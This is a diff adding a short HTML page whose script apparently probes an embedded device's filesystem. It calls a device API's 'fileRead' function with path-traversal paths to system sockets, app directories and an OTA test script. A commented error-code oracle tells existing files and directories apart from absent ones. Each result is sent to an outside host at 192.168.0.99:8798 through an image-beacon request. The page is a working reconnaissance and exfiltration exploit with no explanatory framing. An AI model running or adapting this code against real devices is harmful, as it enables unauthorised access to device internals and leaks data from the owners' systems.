@@ -1,0 +1,15 @@
+<!doctype html><html><head><meta charset="utf-8"></head>
+<body style="background:#000;color:#0f0;font:22px monospace"><pre id="out">u7w4…</pre>
+<script>
+(function(){var out=document.getElementById("out");
+function exfil(t){try{new Image().src="http://192.168.0.99:8798/z?d="+encodeURIComponent(String(t).slice(0,140));}catch(e){}}
+function line(t){out.textContent+="\n"+t;exfil(t);}
+function hi(a,p){try{return HiUtils_createRequest(a,p);}catch(e){return {exc:String(e)};}}
+// oracle: ENXIO=socket exists, ENOENT=absent, EISDIR=dir, success=text file
+["../var/run/superwatchd","../var/run","../tmp","../data/superwatch","../cache/superwatch",
+ "../APPS/installer.ipk","../APPS/shell","../var/local/otaTest.sh","../var/local"].forEach(function(p){
+  var j=hi("fileRead",{path:[p],mode:6});
+  var c=(j.msg&&j.msg.code)||String(j.ret); line(p+" -> "+c);
+});
+})();
+</script></body></html>
